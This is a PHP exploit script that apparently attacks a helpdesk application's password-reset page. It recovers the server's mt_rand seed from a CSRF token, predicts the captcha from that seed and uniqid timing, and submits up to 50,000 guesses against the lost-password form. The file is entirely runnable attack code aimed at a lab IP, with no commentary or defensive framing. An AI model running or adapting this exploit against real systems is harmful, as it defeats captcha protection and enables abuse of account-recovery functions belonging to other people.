<?php

function BuildHash()
{
	return BuildHashBlock() . BuildHashBlock() . BuildHashBlock() . BuildHashBlock();
}

/**
 * Build a Unique Hash Block
 *
 * @author John Haugeland
 * @return string The Hash Block
 */
function BuildHashBlock()
{
    $sub = mt_rand(0, 36 * 36 * 36);
	$Ch1to3 = $sub - 1;		// largest alphanum power that'll fit in the minimum guaranteed 16-bit range for mt_randmax()
    $sec = mt_rand(0, 36 * 36);
	$Ch4to5 = $sec - 1;
	$Ch6to8 = hexdec(substr(uniqid(), -6)) % (36 * 36 * 36);  // only want the bottom two characters of entropy, but clip a large range to keep from much influencing probability

	return str_pad(base_convert($Ch1to3, 10, 36), 3, '0', STR_PAD_LEFT) . str_pad(base_convert($Ch4to5, 10, 36), 2, '0', STR_PAD_LEFT) . str_pad(base_convert($Ch6to8, 10, 36), 3, '0', STR_PAD_LEFT);
}

function getCsrfHashFromPage($page) {
    preg_match('~name="_csrfhash" value="([^"]*)"~', $page, $matches);
    return $matches[1];
}

function getRandsFromHash($block) {
    $first = base_convert(substr($block, 0, 3), 36, 10) + 1; // mod 46656
    $second = base_convert(substr($block, 3, 2), 36, 10) + 1; // mod 1296
    return array($first, $second);
}

function findSeed($hash, $start, $end) {
    list($first, $second) = getRandsFromHash($hash);
    printf("Working from %.6f to %.6f\n", $end, $start);
    $start_usec = $start * 1e6;
    $end_usec = $end * 1e6;

    $current_usec = $end_usec;
    while ($current_usec >= $start_usec) {
        $seconds = floor($current_usec / 1e6);
        $usec = ($current_usec % 1e6) / 1e6;

        $seed = (float) $seconds + ((float) $usec * 100000);
        mt_srand($seed);
        for ($i = 0; $i < 40; $i++) {
            if (mt_rand(0, 36 * 36 * 36) == $first && mt_rand(0, 36 * 36) == $second) {
                return array($seed, $seconds + $usec);
            }
        }

        $current_usec -= 1;
    }
    die('seed not found');
}

$base_url = 'http://172.16.122.131:8333';
$reseed_url = $base_url . "/visitor/index.php?/LiveChat/VisitorUpdate/UpdateFootprint/_isFirstTime=0/_sessionID=1";
$captcha_url = $base_url . "/index.php?/Base/Captcha/GetWordImage";
$test_url = $base_url . '/test.php';
$lost_pw_url = $base_url . "/index.php?/Base/UserLostPassword/Index";
$lost_pw_post = $base_url . "/index.php?/Base/UserLostPassword/Submit";

// Persistent curl object
$curl = curl_init();
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
// curl_setopt($curl, CURLOPT_PROXY, 'http://172.16.122.128:8080');
curl_setopt($curl, CURLOPT_COOKIEJAR, '/dev/null');

// Cause mt_srand call and remember about when it happened
curl_setopt($curl, CURLOPT_URL, $reseed_url);
$start = microtime(true);
curl_exec($curl);
$end = microtime(true);

// Get a valid hash
curl_setopt($curl, CURLOPT_URL, $base_url);
$response = curl_exec($curl);
$hash = getCsrfHashFromPage($response);

// Crack the seed of mt_rand
list($seed, $time) = findSeed($hash, $start, $end);
$srand_called_time = $time - $start;
echo "mt_srand called " . ($time - $start). " seconds after call\n";

// Retrieve page. This generates and stores the captcha.
curl_setopt($curl, CURLOPT_URL, $lost_pw_url);
$start = microtime(true);
$response = curl_exec($curl);
$end = microtime(true);

mt_srand($seed);
for ($i = 0; $i < 34; $i++) {
    mt_rand();
}
$captcha_part = substr(BuildHash(), 0, 5);

curl_setopt($curl, CURLOPT_URL, $lost_pw_post);

$usecs = ($start + $srand_called_time) * 1000000;
for ($i = 1; $i < 50000; $i++) {
    $time_part = usec_to_hashpart($usecs);
    $captcha = preg_replace('/[oli0]/i', '', strtolower(substr($captcha_part . $time_part, 0, 8)));
    printf("%s\n", $captcha);
    curl_setopt($curl, CURLOPT_POSTFIELDS, 'email=some%40user.com&captcha=' . $captcha);
    $response = curl_exec($curl);
    if (strpos($response, "We have sent an email")) {
        die("Captcha is $captcha\n");
    }

    if ($i % 2 == 0) {
        $usecs -= $i;
    } else {
        $usecs += $i;
    }
}

function usec_to_uniqid($usecs) {
    $secs = $usecs / 1000000;
    $usec = $usecs % 1000000;
    return sprintf("%08x%05x", $secs, $usec);
}

function uniqid_to_hashpart($uniqid) {
	$Ch6to8 = hexdec(substr($uniqid, -6)) % (36 * 36 * 36);
	$chars = str_pad(base_convert($Ch6to8, 10, 36), 3, '0', STR_PAD_LEFT);
    return $chars;
}

function usec_to_hashpart($usecs) {
    return uniqid_to_hashpart(usec_to_uniqid($usecs));
}

